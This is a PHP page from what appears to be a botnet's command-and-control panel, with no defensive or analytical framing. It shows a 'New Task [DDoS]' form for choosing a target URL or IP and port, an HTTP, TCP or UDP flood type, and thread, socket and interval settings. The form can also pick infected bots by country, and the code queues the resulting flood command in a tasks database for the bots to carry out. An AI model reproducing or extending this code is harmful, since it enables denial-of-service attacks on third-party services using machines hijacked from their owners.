<?php require_once('../inc/session.php'); require_once('../inc/config.php'); require_once('../other/safe.php'); require_once('../other/rechte.php'); ?>

<script type="text/javascript">
function add(text){
    var tb = document.getElementById("countries");
    tb.value = tb.value + text;
}
</script>

<script type="text/javascript">
function check(){
	if(document.getElementById("countries").value == ""){
		return(confirm("no country selected. OK?"));
	}
}
</script>

<link rel="stylesheet" type="text/css" href="../css/style.css"/>
<link rel="stylesheet" type="text/css" href="../css/tasks.css"/>

<body onunload="opener.location.reload();">

<?php
function get_top20($limit){
$query1 = mysql_query("SELECT COUNT(*) AS count FROM bots");
				
while($row = mysql_fetch_array($query1)){
	$alle = $row[count];
}

if($limit){
	$query2 = mysql_query("SELECT * FROM bots GROUP BY country HAVING count(country) >= 1 ORDER BY count(country) DESC LIMIT 0,10");
}else{
	$query2 = mysql_query("SELECT * FROM bots GROUP BY country HAVING count(country) >= 1 ORDER BY count(country) DESC LIMIT 10,20");
}

$array = array();

while($row = mysql_fetch_array($query2)){
	$country = safe_xss($row['country']);
	$query3  = mysql_query("SELECT COUNT(*) AS count FROM bots WHERE country = '".safe_sql($country)."'");
													
	while($row = mysql_fetch_array($query3)){
		$zahl = safe_xss($row['count']);
								
		array_push($array,$zahl);

		$gesamt = $alle;
		$total  = safe_xss($zahl/$gesamt*100);
							
		if(!empty($country)){
			$countries .= '<label style="display: inline-block; width: 2em;"><img src="../img/flags/'.safe_xss($country).'.gif" OnClick="add(\''.safe_xss($country).',\');" /></label>';
		}
	}
};

return $countries;
}

	echo '<div id="title">New Task [DDoS]</div>
		  <div id="content">
			<form action="ddos.php" method="post">
				<label for="url">URL/IP:</label><input type="text" name="url" id="url" class="box" />:<input type="text" name="port" id="port" class="box" value="80" style="width: 20px;" />
				
				<select name="floodtype" size="1" class="box" style="width: 70px;">
					  <option></option>
					  <option value="HTTP" onclick="document.getElementById(\'http\').style.display=\'block\'; document.getElementById(\'tcp\').style.display=\'none\'; document.getElementById(\'udp\').style.display=\'none\';">HTTP</option>
					  <option value="TCP" onclick="document.getElementById(\'http\').style.display=\'none\'; document.getElementById(\'udp\').style.display=\'none\'; document.getElementById(\'tcp\').style.display=\'block\';">TCP</option>	
					  <option value="UDP" onclick="document.getElementById(\'http\').style.display=\'none\'; document.getElementById(\'tcp\').style.display=\'none\'; document.getElementById(\'udp\').style.display=\'block\';">UDP</option><br />
				</select><br /><br />
				
				<div id="http" style="display: none;">
					<label for="threads1">Threads:</label><input type="text" name="threads1" id="threads1" class="box" style="width: 50px;" /> (e.g.: 10)<br /><br />
					<label for="sockets1">Sockets:</label><input type="text" name="sockets1" id="sockets1" class="box" style="width: 50px;" /> (e.g.: 5)<br /><br />
					<label for="interval1">Interval:</label><input type="text" name="interval1" id="interval1" class="box" style="width: 50px;" /> (e.g.: 10)<br /><br />
				</div>
				
				<div id="tcp" style="display: none;">
					<label for="threads2">Threads:</label><input type="text" name="threads2" id="threads2" class="box" style="width: 50px;" /> (e.g.: 10)<br /><br />
					<label for="sockets2">Sockets:</label><input type="text" name="sockets2" id="sockets2" class="box" style="width: 50px;" /> (e.g.: 5)<br /><br />				
					<label for="interval2">Interval:</label><input type="text" name="interval2" id="interval2" class="box" style="width: 50px;" /> (e.g.: 10)<br /><br />
				</div>
				
				<div id="udp" style="display: none;">
					<label for="threads3">Threads:</label><input type="text" name="threads3" id="threads3" class="box" style="width: 50px;" /> (e.g.: 10)<br /><br />
					<label for="sockets3">Sockets:</label><input type="text" name="sockets3" id="sockets3" class="box" style="width: 50px;" /> (e.g.: 5)<br /><br />				
					<label for="interval3">Interval:</label><input type="text" name="interval3" id="interval3" class="box" style="width: 50px;" /> (e.g.: 10)<br /><br />
				</div>
				
				<label for="top20"><b id="top20">Top 20</b></label>'.get_top20(1).'<br />
				<label for="top20"><b id="top20">      </b></label>'.get_top20(0).' (click on the flags)<br /> <br /><br />
				<label for="countries">Countries:</label><input type="text" name="countries" id="countries" class="box" /> (empty = all)<br /><br />		
			
				<label for="count">Count:</label><input type="text" name="count" id="count" class="box" /> (e.g.: 100)<br /><br />
				<label for="execute">Execute date:</label><input type="text" value="'.date('Y-m-d H:i:s').'" name="execute" id="execute" class="box" /> (Y-m-d H:i:s)<br /><br /><br />
				
				<p align="center"><input type="submit" name="add" value="add & close" class="button" OnClick="return check();" /></p>
			</form>
		  </div>';
		  
	if(isset($_POST['add'])){
		$floodtype = safe_xss($_POST['floodtype']);
		$url 	   = safe_xss($_POST['url']);
		$port      = safe_xss($_POST['port']);
		$interval1  = safe_xss($_POST['interval1']);
		$interval2  = safe_xss($_POST['interval2']);
		$interval3  = safe_xss($_POST['interval3']);
		$threads1  = safe_xss($_POST['threads1']);
		$threads2  = safe_xss($_POST['threads2']);
		$threads3  = safe_xss($_POST['threads3']);
		$sockets1   = safe_xss($_POST['sockets1']);
		$sockets2   = safe_xss($_POST['sockets2']);
		$sockets3   = safe_xss($_POST['sockets3']);
		$countries = safe_xss($_POST['countries']);
		$count     = safe_xss($_POST['count']);
		$execute   = safe_xss($_POST['execute']);

		if($floodtype == 'HTTP'){
			rechte_abfragen('http');
			$cmd = '[http]*'.$url.'*'.$port.'*'.$threads1.'*'.$sockets1.'*'.$interval1.'*'; //[http]*url*port*threads*sockets*sleep
		}else if($floodtype == 'TCP'){
			rechte_abfragen('tcp');
			$cmd = '[tcp]*'.$url.'*'.$port.'*'.$threads2.'*'.$sockets2.'*'.$interval2.'*'; //[tcp]*ip*port*thread*sockets*sleep 
		}else if($floodtype == 'UDP'){
			rechte_abfragen('udp');
			$cmd = '[udp]*'.$url.'*'.$port.'*'.$threads3.'*'.$sockets3.'*'.$interval3.'*'; //[udp]*host*port*threads*sockets*sleep 
		}

		echo $cmd;
		if(empty($url) || empty($count) || empty($execute)){
			echo '<script>alert("Error - Empty fields found");</script>';
		}else{		
			mysql_query("INSERT INTO tasks (command, countries, bots, time) VALUES ('".safe_sql($cmd)."', '".safe_sql($countries)."', '".safe_sql($count)."', '".safe_sql($execute)."')");
			echo '<script>alert("Successfully added");parent.close();</script>';
		}
	}
?>